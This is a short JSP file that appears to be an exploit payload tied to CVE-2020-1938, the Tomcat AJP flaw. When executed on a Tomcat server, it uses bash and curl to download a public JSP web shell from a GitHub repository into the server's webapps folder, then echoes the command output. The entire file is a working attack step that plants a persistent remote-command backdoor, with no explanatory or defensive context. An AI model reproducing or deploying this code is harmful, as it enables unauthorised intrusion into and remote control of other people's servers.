<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%
    try {
        String[] commands = {
                "bash", "-c",
                "curl -o $CATALINA_HOME/webapps/CVE-2020-1938/cmd.jsp  https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/jsp/shell.jsp",
        };
        ProcessBuilder processBuilder = new ProcessBuilder(commands);
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }
        int exitCode = process.waitFor();
        out.println("Command exited with code: " + exitCode);

    } catch (Exception e) {
        out.println("Error executing command: " + e.getMessage());
    }
%>